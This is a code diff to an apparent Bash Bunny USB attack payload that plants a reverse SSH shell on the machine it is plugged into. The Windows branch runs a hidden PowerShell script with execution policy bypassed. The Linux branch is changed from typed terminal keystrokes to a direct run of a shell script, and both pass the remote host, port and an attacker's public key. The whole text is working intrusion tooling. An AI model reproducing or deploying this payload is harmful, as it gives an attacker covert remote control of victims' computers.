@@ -25,6 +25,7 @@ LOOTDIR='/root/udisk/loot/ssh_rshell'
 RHOST=127.0.0.1
 RPORT=4444
 USE_CF=true
+PUBKEY="ssh-ed25519 XXXXXXX" # Replace with your public key
 
 # Start Setup
 LED SETUP
@@ -82,23 +83,13 @@ echo "$OS Host detected" >> $LOOTDIR/ssh_rshell.log
 ATTACKMODE HID STORAGE
 LED STAGE2
 if [ "$OS" = "WIN" ]; then
-    RUN WIN powershell -WindowStyle Hidden -ExecutionPolicy Bypass "Add-Type -AssemblyName System.Windows.Forms; .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\\WinRSSH-Shell.ps1') $RHOST $RPORT $USE_CF"
+    RUN WIN powershell -WindowStyle Hidden -ExecutionPolicy Bypass "Add-Type -AssemblyName System.Windows.Forms; .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\library\\RemoteAccess\\ReverseSSH\\WinRSSH-Shell.ps1') $RHOST $RPORT $USE_CF $PUBKEY"
     LED FINISH
     exit 0
-else if [ "$OS = "LINUX" ]; then
-    # Open terminal
-    Q CTRL-ALT t
-
-    # Copy and run bash script
-    Q STRING "cp \$(readlink -f /dev/disk/by-label/BashBunny | while read dev;do mount | grep \"\$dev\b\" | awk '{print \$3}';done)/payloads/"
-    Q STRING $SWITCH_POSITION
-    Q STRING "/LinuxSSH-RShell.sh ~/LinuxSSH-RShell.sh && chmod +x ~/LinuxSSH-RShell.sh && ~/LinuxSSH-RShell.sh $RHOST $RPORT"
-    Q ENTER
-
-    # Quit the terminal
-    LED CLEANUP
-    Q STRING exit
-    Q ENTER
+elif [ "$OS" = "LINUX" ]; then
+    RUN LINUX bash ((lsblk -l | grep BashBunny | cut -d' ' -f7)+'/payloads/library/RemoteAccess/ReverseSSH/LinuxSSH-RShell.sh') $RHOST $RPORT $PUBKEY
+    LED FINISH
+    exit 0
 fi
 
 
